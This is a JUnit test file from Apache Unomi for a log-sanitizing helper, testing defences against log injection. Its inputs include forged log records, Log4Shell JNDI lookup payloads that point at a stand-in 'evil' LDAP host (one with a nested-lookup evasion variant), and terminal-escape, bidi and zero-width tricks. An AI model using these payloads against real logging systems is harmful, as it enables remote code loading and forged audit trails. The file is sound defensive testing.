/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.unomi.api.utils;

import org.junit.Test;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

/**
 * The values this guards are attacker-controlled by definition — uploaded filenames, event property
 * names, cookies, session ids — so these are the cases an attacker would actually try.
 */
public class LogSanitizerTest {

    /**
     * The core defence: a newline would let an attacker close the current log record and write their
     * own, forging an entry that an operator or SIEM would read as genuine.
     */
    @Test
    public void newlinesCannotForgeALogRecord() {
        String forged = "innocent.groovy\n2026-08-08 12:00:00 WARN  AUDIT groovy-action save: action=already-approved";

        String sanitized = LogSanitizer.forLogging(forged);

        assertFalse("a newline must not survive into the log", sanitized.contains("\n"));
        assertFalse("a carriage return must not survive into the log", sanitized.contains("\r"));
        assertTrue("the original text should still be recognisable", sanitized.startsWith("innocent.groovy_"));
    }

    @Test
    public void controlCharactersAreReplaced() {
        // ESC is what makes an ANSI sequence act on a terminal; the "[2J" after it is ordinary
        // printable text, which is why only the ESC itself needs replacing.
        String sanitized = LogSanitizer.forLogging("a\u001b[2Jb\tc\u0000d");

        assertFalse("ESC must not survive", sanitized.indexOf(0x1b) >= 0);
        assertFalse("TAB must not survive", sanitized.contains("\t"));
        assertFalse("NUL must not survive", sanitized.indexOf(0) >= 0);
        assertEquals("a_[2Jb_c_d", sanitized);
    }

    /** {@code {} $ %} are formatter markers; a downstream pattern layout must not act on them. */
    @Test
    public void logFormatMarkersAreNeutralised() {
        String sanitized = LogSanitizer.forLogging("${jndi:ldap://evil/x} {} %n");

        assertFalse(sanitized.contains("$"));
        assertFalse(sanitized.contains("{"));
        assertFalse(sanitized.contains("}"));
        assertFalse(sanitized.contains("%"));
    }

    @Test
    public void oversizedValuesAreTruncatedSoTheyCannotFloodTheLog() {
        String sanitized = LogSanitizer.forLogging("a".repeat(5000));

        assertTrue(sanitized.endsWith("...[truncated]"));
        assertTrue("truncated output must stay bounded", sanitized.length() < 300);
    }

    @Test
    public void callerSuppliedLimitIsHonoured() {
        assertEquals("abc...[truncated]", LogSanitizer.forLogging("abcdef", 3));
    }

    @Test
    public void ordinaryValuesArePassedThroughUnchanged() {
        assertEquals("myAction", LogSanitizer.forLogging("myAction"));
        assertEquals("a1b2c3d4-e5f6-7890-abcd-ef1234567890",
                LogSanitizer.forLogging("a1b2c3d4-e5f6-7890-abcd-ef1234567890"));
    }

    /** Distinguishable from an empty value, so an audit record never silently loses a field. */
    @Test
    public void nullBecomesAnExplicitMarker() {
        assertEquals("null", LogSanitizer.forLogging(null));
    }

    // ---------------------------------------------------------------------------------------
    // Evasion attempts. Each of these defeats at least one naive implementation of this filter.
    // ---------------------------------------------------------------------------------------

    /**
     * The classic bypass of a {@code Character.isISOControl} check: U+2028 and U+2029 are Unicode
     * line terminators but are <em>not</em> ISO controls, so a validator written against that
     * predicate lets them through while JSON log pipelines and JS-based log viewers still break the
     * line on them. An allowlist of printable ASCII is immune; a denylist of control characters is not.
     */
    @Test
    public void unicodeLineTerminatorsThatAreNotIsoControlsAreStillRemoved() {
        assertFalse(Character.isISOControl('\u2028'));
        assertFalse(Character.isISOControl('\u2029'));

        String sanitized = LogSanitizer.forLogging("a\u2028forged\u2029line\u0085nel");

        assertEquals("a_forged_line_nel", sanitized);
    }

    /**
     * Log4j lookup evasion: the payload hides {@code jndi} behind a nested lookup so a filter
     * searching for the literal string "jndi" misses it. Filtering the {@code $} and braces that
     * make a lookup a lookup defeats the whole family, known and unknown.
     */
    @Test
    public void nestedLookupEvasionIsNeutralised() {
        String sanitized = LogSanitizer.forLogging("${${lower:j}${lower:n}di:ldap://evil/a}");

        assertFalse(sanitized.contains("$"));
        assertFalse(sanitized.contains("{"));
        assertFalse(sanitized.contains("}"));
        assertTrue("the text should survive in inert form", sanitized.contains("ldap://evil/a"));
    }

    /**
     * A lone high surrogate at the truncation boundary. Cutting a string with {@code substring} can
     * split a surrogate pair and leave an unpaired half, which some appenders and JSON encoders
     * reject or mangle. Filtering after truncation means the orphan is replaced like any other
     * non-ASCII char, so the result is always well-formed.
     */
    @Test
    public void truncationCannotLeaveAnUnpairedSurrogate() {
        String emoji = "\uD83D\uDE00"; // U+1F600, a surrogate pair
        StringBuilder payload = new StringBuilder();
        for (int i = 0; i < 199; i++) {
            payload.append('a');
        }
        payload.append(emoji);

        String sanitized = LogSanitizer.forLogging(payload.toString());

        for (int i = 0; i < sanitized.length(); i++) {
            assertFalse("no unpaired surrogate may survive", Character.isSurrogate(sanitized.charAt(i)));
        }
    }

    /**
     * Terminal control: BS overwrites already-printed characters and ESC]0; retitles the window, so
     * an attacker can make a log line read as something else entirely in a live terminal.
     */
    @Test
    public void terminalRewritingSequencesAreRemoved() {
        String sanitized = LogSanitizer.forLogging("denied\b\b\b\b\b\b\u001b]0;granted\u0007");

        assertFalse(sanitized.contains("\b"));
        assertFalse("BEL must not survive", sanitized.indexOf(7) >= 0);
        assertTrue(sanitized.startsWith("denied"));
    }

    /**
     * Right-to-left override reverses the display order of everything after it, so a log entry can
     * be made to read backwards — {@code deined} for {@code denied} — without changing the bytes a
     * grep would match.
     */
    @Test
    public void bidiOverrideCannotReorderTheDisplayedLine() {
        String sanitized = LogSanitizer.forLogging("action=\u202egnitirw\u202c");

        assertFalse(sanitized.contains("\u202e"));
        assertFalse(sanitized.contains("\u202c"));
    }

    /** Zero-width characters split a token so an exact-match SIEM rule no longer fires on it. */
    @Test
    public void zeroWidthCharactersCannotHideATokenFromSearch() {
        String sanitized = LogSanitizer.forLogging("ad\u200bmin\ufeff");

        assertFalse(sanitized.contains("\u200b"));
        assertFalse(sanitized.contains("\ufeff"));
        assertEquals("ad_min_", sanitized);
    }

    /**
     * A payload placed beyond the truncation point must not come back: truncation happens first, so
     * anything past the limit is gone before it can be interpreted.
     */
    @Test
    public void payloadHiddenBeyondTheTruncationPointIsDropped() {
        String sanitized = LogSanitizer.forLogging("a".repeat(400) + "\nWARN forged-record");

        assertFalse(sanitized.contains("forged-record"));
        assertFalse(sanitized.contains("\n"));
    }

    /**
     * An escaped newline: if any downstream formatter or JSON decoder unescapes the value, a
     * surviving backslash would become a real newline. Filtering the backslash removes that
     * second-order path.
     */
    @Test
    public void escapedNewlineCannotBeRevivedDownstream() {
        String sanitized = LogSanitizer.forLogging("a\\nb\\u000ac");

        assertFalse("no backslash may survive to be unescaped later", sanitized.contains("\\"));
    }

    /** Sanitizing twice must equal sanitizing once, or nested logging would corrupt the value. */
    @Test
    public void sanitizationIsIdempotent() {
        String once = LogSanitizer.forLogging("a\nb\u2028c${x}\uD83D\uDE00");

        assertEquals(once, LogSanitizer.forLogging(once));
    }

    /** A negative limit must not throw: this helper is called from inside log statements. */
    @Test
    public void negativeLimitIsClampedRatherThanThrowing() {
        assertEquals("...[truncated]", LogSanitizer.forLogging("abcdef", -1));
        assertEquals("...[truncated]", LogSanitizer.forLogging("abcdef", 0));
    }

}
